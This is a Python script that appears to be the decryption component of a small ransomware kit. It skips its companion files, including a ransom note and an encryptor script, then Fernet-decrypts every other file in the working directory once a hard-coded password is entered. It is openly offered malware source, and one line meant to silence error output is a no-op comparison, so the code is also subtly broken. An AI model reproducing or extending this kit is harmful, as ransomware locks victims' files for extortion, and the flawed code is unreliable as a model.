import os
from cryptography.fernet import Fernet
from art import *
from termcolor import colored
from time import sleep
import sys

class DevNull:
    def write(self, msg):
        pass
sys.stderr == DevNull()

files = []


for file in os.listdir():
    if file == "monsterwith23faces.py" or file == "store.key" or file == "cyanide.py" or file == "ransom_note.txt":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("store.key", "rb") as thekey:
    key = thekey.read()

secret_input_key = "samsepiol"

user_input = input("SeCr3T KeY?:\n")

if user_input == secret_input_key:
    for file in files:
        with open(file, "rb") as target_data:
            contents = target_data.read()
            contents_decrypted = Fernet(key).decrypt(contents)
        with open(file, "wb") as target_data:
            target_data.write(contents_decrypted)
